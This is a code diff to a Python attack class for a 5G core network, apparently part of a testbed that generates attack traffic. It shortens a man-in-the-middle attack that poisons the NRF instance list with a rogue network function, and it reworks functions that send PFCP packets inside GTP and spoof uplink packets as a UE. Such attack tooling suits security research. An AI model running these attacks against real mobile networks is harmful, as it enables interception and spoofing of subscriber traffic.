@@ -46,7 +46,7 @@ class Attacks():
             Poison the NRF inner list of Instance to make a rogue Instance the highest priority.
             The request happening from this moment are sent to the rogue which relays it.
             The rogue instance is effectively a man in the middle.
-            Wait ~120 (+/- 10) seconds before removing the man in the middle.
+            Wait ~60 (+/- 10) seconds before removing the man in the middle.
         """
         
         nf_type = NFInstance.get_random_nf_type()
@@ -55,7 +55,7 @@ class Attacks():
         start = CNMitm.start(nf_type)
         print(f"-- MITM started: {start}")
         
-        time_to_sleep = int(random.normalvariate(120, 10))
+        time_to_sleep = int(random.normalvariate(60, 10))
         print(f"-- Sleeping for {time_to_sleep} seconds during MITM")
         time.sleep(time_to_sleep)
         
@@ -217,18 +217,17 @@ class Attacks():
 
         # PACKET FORWARDING 
 
-    def pfcp_in_gtp() -> bool:
+    def pfcp_in_gtp(ue_addr:str, teid:int) -> bool:
         """ 
             Send 1 pfcp packet encapsulated in a gtp layer.
             The pfcp packet is benign but having this kind of encapsulation could be used for attacks and shouldn't happen.
         """
         pfcp_packet = PFCPRequest.association_setup(
-            src_addr=get_my_ip_from_prefix(),
+            src_addr=ue_addr,
             dst_addr=ip_list["UPF"]
         )
         
-        teid = random.randint(0, PFCPRequest.max_teid)
-        print(f"Sending PFCP in GTP: teid={teid}")
+        print(f"Sending PFCP in GTP from ue {ue_addr} teid={teid}")
         
         send(
             pfcp_in_gtp_packet(
@@ -241,14 +240,12 @@ class Attacks():
         )
         return True
 
-    def uplink_spoofing() -> bool:
+    def uplink_spoofing(ue_addr:str, teid:int) -> bool:
         """
             Send 1 packet from the CN spoofing an UE.
             The packet is supposed to be send to the DN where it will be seen as originating from the UE.
         """
         tunnel_dst_addr = random.choice(dn_domains)
-        ue_addr = PFCPRequest.random_ue_address()
-        teid = random.randint(0, PFCPRequest.max_teid)
         print(f"Sending uplink spoofing: tunnel_dst_addr={tunnel_dst_addr}, ue_addr={ue_addr}, teid={teid}")
         
         send(
